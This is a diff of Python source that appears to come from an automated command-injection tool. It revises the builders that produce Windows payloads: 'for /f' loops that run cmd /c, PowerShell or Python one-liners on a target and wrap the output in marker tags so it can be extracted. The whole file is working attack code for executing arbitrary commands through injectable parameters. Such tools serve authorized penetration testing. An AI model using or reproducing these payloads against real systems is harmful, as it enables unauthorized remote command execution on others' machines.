@@ -36,9 +36,9 @@ def decision(separator, TAG, randv1, randv2):
     else:
       # 'set /p' prints its prompt without a trailing newline, so the marker arrives in one piece.
       payload = (chain +
-              "for /f \"tokens=*\" %i in ('cmd /c \"" +
+              "for /f \"tokens=* eol=\" %i in ('cmd /c \"" +
               "set /a (" + str(randv1) + "%2B" + str(randv2) + ")" +
-              "\"') do @set /p=" + TAG + "%i" + TAG + TAG + settings.CMD_NUL + checks.WINDOWS_TAIL
+              "\"') do @" + settings.CMD_NUL + " set /p=" + TAG + "%i" + TAG + TAG
               )
   else:
     if settings.USE_BACKTICKS or settings.WAF_ENABLED:
@@ -76,9 +76,9 @@ def decision_alter_interpreter(separator, TAG, randv1, randv2):
       python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"print('" + TAG + "'%2Bstr(int(" + str(int(randv1)) + "%2B" + str(int(randv2)) + "))" + "%2B'" + TAG + "'%2B'" + TAG + "')\""
 
     payload = (chain +
-              "for /f \"tokens=*\" %i in ('cmd /c " +
+              "for /f \"tokens=* eol=\" %i in ('cmd /c " +
               python_payload +
-              "') do @set /p=%i" + settings.CMD_NUL + checks.WINDOWS_TAIL
+              "') do @" + settings.CMD_NUL + " set /p=%i"
               )
   else:
     if settings.SKIP_CALC:
@@ -113,9 +113,9 @@ def cmd_execution(separator, TAG, cmd):
                 )
     else:
       payload = (chain +
-                "for /f \"tokens=*\" %i in ('cmd /c \"" +
+                "for /f \"tokens=* eol=\" %i in ('cmd /c \"" +
                 cmd +
-                "\"') do @set /p=" + TAG + TAG + "%i" + TAG + TAG + settings.CMD_NUL + checks.WINDOWS_TAIL
+                "\"') do @" + settings.CMD_NUL + " set /p=" + TAG + TAG + "%i" + TAG + TAG
                 )
   else:
     settings.USER_APPLIED_CMD = cmd
@@ -146,11 +146,11 @@ def cmd_execution_alter_interpreter(separator, TAG, cmd):
     else:
       # Run through 'cmd /c', or PowerShell would look the command up among its own cmdlets.
       payload = (chain +
-                "for /f \"tokens=*\" %i in ('" +
+                "for /f \"tokens=* eol=\" %i in ('" +
                 settings.WIN_PYTHON_INTERPRETER +
                 " -c \"import os; os.system('powershell.exe -InputFormat none write-host " +
                 TAG + TAG + " $(cmd /c " + cmd + ") "+ TAG + TAG + "')\"" +
-                "') do @set /p=%i" + settings.CMD_NUL + checks.WINDOWS_TAIL
+                "') do @" + settings.CMD_NUL + " set /p=%i"
                 )
   else:
     settings.USER_APPLIED_CMD = cmd
